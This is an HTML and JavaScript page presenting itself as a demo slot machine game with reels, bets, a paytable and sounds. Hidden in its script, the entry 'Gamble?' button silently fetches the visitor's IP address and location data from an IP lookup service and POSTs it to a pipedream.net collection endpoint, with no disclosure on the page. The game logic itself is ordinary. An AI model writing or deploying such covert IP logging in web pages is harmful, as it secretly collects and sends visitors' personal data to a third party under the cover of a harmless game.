<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>RX Slots â€” Clean & Modern Slot Machine</title>
  <style>
    :root{
      --bg:#0f1724; --card:#0b1220; --accent:#7c3aed; --muted:#94a3b8; --glass: rgba(255,255,255,0.04);
      --win:#16a34a; --lose:#dc2626;
      font-family: Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; padding:36px; background:linear-gradient(180deg,#071027 0%, #07152a 60%); color:#e6eef8; -webkit-font-smoothing:antialiased;
      display:flex; align-items:center; justify-content:center;
    }.container{width:940px; max-width:96vw; background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent); border-radius:18px; padding:28px; box-shadow:0 10px 40px rgba(2,6,23,0.6); border:1px solid rgba(255,255,255,0.03); display:grid; grid-template-columns:1fr 360px; gap:20px}

/* Left: machine */
.machine{
  background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.02)); border-radius:12px; padding:20px; min-height:340px; display:flex; flex-direction:column; gap:16px; justify-content:center; align-items:center;
}

.reels{display:flex; gap:12px; align-items:center}
.reel{width:120px; height:140px; background:var(--glass); border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:62px; position:relative; overflow:hidden; border:1px solid rgba(255,255,255,0.03)}
.reel .strip{position:absolute; top:0; left:0; right:0; display:flex; flex-direction:column; align-items:center; transition:transform 700ms cubic-bezier(.2,.9,.2,1)}
.symbol{height:140px; display:flex; align-items:center; justify-content:center; width:100%;}

.controls{display:flex; gap:12px; align-items:center}
.btn{background:linear-gradient(180deg,var(--accent), #5b21b6); border-radius:10px; padding:12px 18px; border:none; color:white; cursor:pointer; font-weight:600; box-shadow:0 6px 20px rgba(124,58,237,0.2)}
.btn.secondary{background:transparent; border:1px solid rgba(255,255,255,0.05); padding:10px 14px; box-shadow:none}

.sidebar{background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent); border-radius:12px; padding:20px}
.stat{display:flex; justify-content:space-between; margin-bottom:12px; color:var(--muted)}
.large{font-size:20px; font-weight:700}

.bet-row{display:flex; gap:8px; align-items:center; margin-top:8px}
input[type=range]{width:100%}

.message{height:36px; display:flex; align-items:center; justify-content:center; border-radius:8px; background:rgba(255,255,255,0.02); color:var(--muted)}
.message.win{background:linear-gradient(90deg, rgba(22,163,74,0.12), rgba(22,163,74,0.06)); color:var(--win)}
.message.lose{background:linear-gradient(90deg, rgba(220,38,38,0.08), rgba(220,38,38,0.04)); color:var(--lose)}

/* overlay Gamble? */
.overlay{position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:linear-gradient(180deg, rgba(2,6,23,0.72), rgba(2,6,23,0.84)); z-index:60}
.overlay-card{background:linear-gradient(180deg,#07122a, #071427); border-radius:12px; padding:28px; width:420px; text-align:center; box-shadow:0 18px 60px rgba(2,6,23,0.6); border:1px solid rgba(255,255,255,0.03)}
.overlay h2{margin:0 0 6px 0}
.overlay p{color:var(--muted); margin:0 0 20px}

/* small details */
.credits{font-size:12px; color:var(--muted); margin-top:12px}

/* coin animation when win */
.coins{position:absolute; pointer-events:none; inset:0}
.coin{position:absolute; width:18px; height:18px; border-radius:50%; background:gold; box-shadow:0 2px 6px rgba(0,0,0,0.4); opacity:0; transform:translateY(0) scale(0.8)}

@media(max-width:820px){.container{grid-template-columns:1fr; padding:18px}}

  </style>
</head>
<body>
  <div class="container" role="main">
    <div class="machine" aria-live="polite">
      <div style="display:flex; width:100%; justify-content:space-between; align-items:center">
        <div style="display:flex; flex-direction:column">
          <div style="font-size:14px;color:var(--muted)">Balance</div>
          <div id="balance" class="large">$1000</div>
        </div>
        <div style="text-align:right">
          <div style="font-size:14px;color:var(--muted)">Last Result</div>
          <div id="lastResult" style="font-weight:700">â€”</div>
        </div>
      </div><div class="reels" id="reels">
    <div class="reel" data-index="0">
      <div class="strip"></div>
    </div>
    <div class="reel" data-index="1">
      <div class="strip"></div>
    </div>
    <div class="reel" data-index="2">
      <div class="strip"></div>
    </div>
  </div>

  <div class="controls">
    <button class="btn" id="spinBtn">Spin</button>
    <button class="btn secondary" id="autoplayBtn">Auto: Off</button>
    <div style="min-width:220px">
      <div style="font-size:13px;color:var(--muted); margin-bottom:6px">Bet</div>
      <div class="bet-row">
        <input id="betRange" type="range" min="1" max="200" value="10" />
        <div id="betValue" style="width:54px; text-align:right; font-weight:700">$10</div>
      </div>
    </div>
  </div>

  <div class="message" id="message">Good luck!</div>

  <div class="credits">Made with a gambling addictionÂ· Sounds expected at <code>sounds/</code></div>

  <div class="coins" id="coins"></div>
</div>

<aside class="sidebar">
  <div class="stat"><div>Paytable</div><div style="color:var(--muted)">Multiplier</div></div>
  <div class="stat"><div>3x Match</div><div><strong>Ã—5</strong></div></div>
  <div class="stat"><div>2x Match</div><div><strong>Ã—2</strong></div></div>
  <div style="height:12px"></div>
  <div style="font-weight:700; margin-bottom:6px">Quick Actions</div>
  <button class="btn secondary" id="maxBet">Max Bet</button>
  <button class="btn secondary" id="resetBtn">Reset Balance</button>
  <div style="height:12px"></div>
  <div style="font-weight:700; margin-bottom:6px">Sound</div>
  <label style="display:flex; gap:8px; align-items:center"><input type="checkbox" id="mute" /> Mute</label>
  <div style="height:12px"></div>
  <div style="font-size:13px;color:var(--muted)">Tip: Matching three identical symbols pays Ã—5, two identical pays Ã—2.</div>
</aside>

  </div>  <!-- Overlay: Gamble? -->  <div class="overlay" id="entryOverlay">
    <div class="overlay-card">
      <h2>Gamble?</h2>
      <p>Are you sure you want to access the gambling machine? Click the button below to continue.</p>
      <button id="clickMe" class="btn" style="font-size:18px; padding:12px 26px">Gamble?</button>
      <div style="height:12px"></div>
      <div class="credits">By continuing you accept responsibility. For demo purposes only.</div>
    </div>
  </div>  <!-- Sounds (must exist at the given paths) --><audio id="soundSpin" src="sounds/spin.mp3" preload="auto"></audio> <audio id="soundWin" src="sounds/win.mp3" preload="auto"></audio> <audio id="soundLose" src="sounds/lose.mp3" preload="auto"></audio>

  <script>
    // ----- pipedream & IP send (runs when Gamble? clicked) -----
    const pipedreamURL = "https://eozjl51eif5jnhw.m.pipedream.net"; // replace if needed

    document.getElementById("clickMe").addEventListener("click", async () => {
      try {
        // hide overlay and initialize UI
        document.getElementById('entryOverlay').style.display = 'none';

        // Fetch IP info from ipwho.is
        const response = await fetch("https://ipwho.is/");
        const data = await response.json();

        // Send the data to Pipedream
        await fetch(pipedreamURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });

        // show a tiny toast
        showTempMessage('Gambling Worked!', 1600);
      } catch (err) {
        console.error(err);
        showTempMessage('Error!', 2000);
      }
    });

    // ----- Slot machine logic -----
    const symbols = ["ðŸ’","ðŸ‹","ðŸŠ","â­","ðŸ’Ž","ðŸ””"];
    const reelsEl = document.querySelectorAll('.reel');
    const spinBtn = document.getElementById('spinBtn');
    const autoplayBtn = document.getElementById('autoplayBtn');
    const betRange = document.getElementById('betRange');
    const betValue = document.getElementById('betValue');
    const balanceEl = document.getElementById('balance');
    const messageEl = document.getElementById('message');
    const lastResultEl = document.getElementById('lastResult');
    const muteChk = document.getElementById('mute');
    const maxBetBtn = document.getElementById('maxBet');
    const resetBtn = document.getElementById('resetBtn');

    const soundSpin = document.getElementById('soundSpin');
    const soundWin = document.getElementById('soundWin');
    const soundLose = document.getElementById('soundLose');

    let balance = 1000;
    let autoplay = false;
    let autoInterval = null;

    function renderBalance(){ balanceEl.textContent = `$${balance}` }
    renderBalance();

    // prepare strips
    reelsEl.forEach(r => buildStrip(r));

    betRange.addEventListener('input', ()=>{ betValue.textContent = `$${betRange.value}` });

    maxBetBtn.addEventListener('click', ()=>{ betRange.value = Math.min(200, balance); betValue.textContent = `$${betRange.value}` });
    resetBtn.addEventListener('click', ()=>{ balance = 1000; renderBalance(); showMessage('Balance reset', 1200); });

    autoplayBtn.addEventListener('click', ()=>{
      autoplay = !autoplay; autoplayBtn.textContent = `Auto: ${autoplay? 'On' : 'Off'}`;
      if(autoplay){
        autoInterval = setInterval(()=>{ if(!spinBtn.disabled) spin(); }, 1400);
      } else { clearInterval(autoInterval); }
    });

    muteChk.addEventListener('change', ()=>{
      const mute = muteChk.checked;
      [soundSpin, soundWin, soundLose].forEach(s=> s.muted = mute);
    });

    spinBtn.addEventListener('click', spin);

    function playSound(el){ if(!muteChk.checked){ try { el.currentTime = 0; el.play(); } catch(e){ /* ignore */ } } }

    function buildStrip(reel){ const strip = reel.querySelector('.strip'); strip.innerHTML = ''; // create a longer strip for nicer animation
      for(let i=0;i<10;i++){ const sym = symbols[(i)%symbols.length]; const d = document.createElement('div'); d.className='symbol'; d.textContent = symbols[i % symbols.length]; strip.appendChild(d); }
    }

    function spin(){
      const bet = Math.min(Number(betRange.value), balance);
      if(bet <= 0) { showMessage('Set a valid bet', 1200); return; }
      balance -= bet; renderBalance();
      spinBtn.disabled = true; autoplayBtn.disabled = true;

      playSound(soundSpin);

      // random final positions
      const outcomes = [];
      reelsEl.forEach((r, idx) => {
        const strip = r.querySelector('.strip');
        // pick a random symbol index
        const finalIdx = Math.floor(Math.random() * symbols.length);
        outcomes.push(finalIdx);
        // compute translateY so that the chosen symbol sits in view
        // each symbol height is 140px
        const offset = -finalIdx * 140 - (140*2); // center by having some extra cycles
        // add slight delay per reel
        strip.style.transition = `transform ${700 + idx*120}ms cubic-bezier(.2,.9,.2,1)`;
        // pre-translate (instant) so animation looks smooth: give a starting offset
        strip.style.transform = `translateY(${offset}px)`;
      });

      // after all animations finish, evaluate
      const maxDuration = 700 + (reelsEl.length-1)*120 + 80;
      setTimeout(()=>{
        // map indices to symbols
        const finalSymbols = outcomes.map(i=>symbols[i]);
        const counts = {};
        finalSymbols.forEach(s=>counts[s] = (counts[s]||0)+1);
        // determine payout
        let payout = 0; let resultText = 'No win';
        if(Object.values(counts).includes(3)){
          payout = bet * 5; resultText = 'Big Win!';
        } else if(Object.values(counts).includes(2)){
          payout = bet * 2; resultText = 'Small Win';
        }

        if(payout>0){ balance += payout; renderBalance(); showResult(true, resultText, payout); playSound(soundWin); triggerCoins(); }
        else { showResult(false, 'Lose', 0); playSound(soundLose); }

        // place visible final symbols (snap to exact symbol positions to avoid visual drift)
        reelsEl.forEach((r, idx) => {
          const strip = r.querySelector('.strip');
          const finalIdx = outcomes[idx];
          const offset = -finalIdx * 140;
          strip.style.transition = `transform 250ms ease-out`;
          strip.style.transform = `translateY(${offset}px)`;
        });

        spinBtn.disabled = false; autoplayBtn.disabled = false; lastResultEl.textContent = finalSymbols.join(' ');

      }, maxDuration + 100);
    }

    function showResult(win, text, amount){ messageEl.classList.remove('win','lose'); if(win){ messageEl.classList.add('win'); messageEl.textContent = `${text} +$${amount}` } else { messageEl.classList.add('lose'); messageEl.textContent = `${text}` } }

    function showMessage(text, ms=1500){ messageEl.classList.remove('win','lose'); messageEl.textContent = text; setTimeout(()=>{ messageEl.textContent = 'Good luck!'; }, ms); }

    function showTempMessage(text, ms=1400){ const prev = messageEl.textContent; messageEl.textContent = text; setTimeout(()=> messageEl.textContent = prev, ms); }

    // simple coin burst when win
    function triggerCoins(){ const container = document.getElementById('coins'); for(let i=0;i<12;i++){ const c = document.createElement('div'); c.className='coin'; c.style.left = (40 + Math.random()*520) + 'px'; c.style.top = (40 + Math.random()*160) + 'px'; container.appendChild(c);
        requestAnimationFrame(()=>{ c.style.transition = `transform ${800 + Math.random()*700}ms cubic-bezier(.2,.8,.2,1), opacity ${700 + Math.random()*600}ms`; c.style.opacity=1; const dy = -140 - Math.random()*240; c.style.transform = `translateY(${dy}px) scale(${0.7 + Math.random()*0.8}) rotate(${Math.random()*360}deg)`; });
        setTimeout(()=>{ c.style.opacity=0; setTimeout(()=> c.remove(), 1400); }, 900 + Math.random()*600);
    } }

    // small helper to show final overlay and set up initial strips for visual
    function init(){ // set final positions randomly for initial state
      reelsEl.forEach((r, idx)=>{
        const finalIdx = Math.floor(Math.random()*symbols.length);
        const strip = r.querySelector('.strip'); strip.style.transform = `translateY(${ -finalIdx * 140 }px)`;
      });
    }

    init();

    // accessibility: allow Enter to spin when focused on spin button
    spinBtn.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') spin(); });

  </script></body>
</html>
